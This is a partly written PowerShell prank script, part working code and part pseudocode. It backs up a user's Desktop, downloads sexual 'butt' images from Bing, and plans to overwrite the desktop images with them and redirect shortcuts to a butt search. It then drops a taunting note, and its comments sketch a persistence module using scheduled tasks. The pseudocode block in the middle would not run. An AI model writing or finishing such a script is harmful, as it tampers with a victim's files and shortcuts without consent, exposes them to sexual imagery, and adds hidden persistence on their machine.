# Set Desktop Path, switch to OneDrive path format if OneDrive folder exists
$desktop = "$home\Desktop"
if((Test-Path $env:OneDrive) -Or (Test-Path $env:OneDriveCommercial)) {
    $desktop = "$env:OneDrive\Desktop"
}

# Copy Desktop Contents to Goofin for safe keepin
Copy-Item -Path $desktop -Destination "C:\Goofin\cuts" -Recurse -Force

# enumerate targets for replacement & grab number of butts needed for grand plan
$butts = (gci $home\OneDrive\Desktop\ -Recurse)
$buttlist = (echo $butts | Get-Member)
$buttcount = $buttlist.Count



# seeds array from text file and  pulls an entry at random, converts to a string and returns
$seeds = Get-Content .\buttseeds.txt
$hash = @{}
foreach ($s in $seeds)
 {
  $hash.add($s,(Get-Random -Maximum $seeds.count))
 }
$hash.GetEnumerator() | Get-Random -OutVariable buttseed
$buttseed | out-string | echo


# script parameters, feel free to change it 
$downloadFolder = "C:\Goofin\butts"
$searchFor =  "sexy ass butts" # $buttseed
$nrOfImages = $buttcount

# create a WebClient instance that will handle Network communications 
$webClient = New-Object System.Net.WebClient

# load System.Web so we can use HttpUtility
Add-Type -AssemblyName System.Web

# URL encode our search query
$searchQuery = [System.Web.HttpUtility]::UrlEncode($searchFor)

$url = "http://www.bing.com/images/search?q=$searchQuery&first=0&count=$nrOfImages&qft=+filterui%3alicense-L2_L3_L4"

# get the HTML from resulting search response
$webpage = $webclient.DownloadString($url)

# use a 'fancy' regular expression to finds Urls terminating with '.jpg' or '.png'
$regex = "[(http(s)?):\/\/(www\.)?a-z0-9@:%._\+~#=]{2,256}\.[a-z]{2,6}\b([-a-z0-9@:%_\+.~#?&//=]*)((.jpg(\/)?)|(.png(\/)?)){1}(?!([\w\/]+))"

$listImgUrls = $webpage | Select-String -pattern $regex -Allmatches | ForEach-Object {$_.Matches} | Select-Object $_.Value -Unique

# let's figure out if the folder we will use to store the downloaded images already exists
if((Test-Path $downloadFolder) -eq $false) 
{
  Write-Output "Creating '$downloadFolder'..."

  New-Item -ItemType Directory -Path $downloadFolder | Out-Null
}


foreach($imgUrlString in $listImgUrls) 
{
  [Uri]$imgUri = New-Object System.Uri -ArgumentList $imgUrlString

  # this is a way to extract the image name from the Url
  $imgFile = [System.IO.Path]::GetFileName($imgUri.LocalPath)

  # build the full path to the target download location
  $imgSaveDestination = Join-Path $downloadFolder $imgFile

  Write-Output "Downloading '$imgUrlString' to '$imgSaveDestination'..."

  $webClient.DownloadFile($imgUri, $imgSaveDestination)  
} 



    for each target in targets
        Where extension = any image extension
            Copy each item with original filename to Goofin/cuts        
            Loop through and replace file with $butts content sequentially, starting over if more targets > butts
        Where extension = .lnk 
            Copy each item with original filename to Goofin/cuts
            leave icon the same, just redirect link to open a google search for random butt search



# Hit 'em with it
echo "Now who's boss." | Out-File -FilePath "C:\Goofin\buttbossin.txt" 
notepad "C:\Goofin\buttbossin.txt"   

# Politeness Module
# Reset the photots and icons after X minutes

# Persistence Module
# Schduled task for the script
# Could we set it to choose a number between 7-20 = x and create a that runs every x days?
# Could we trigger it off of a specific event number?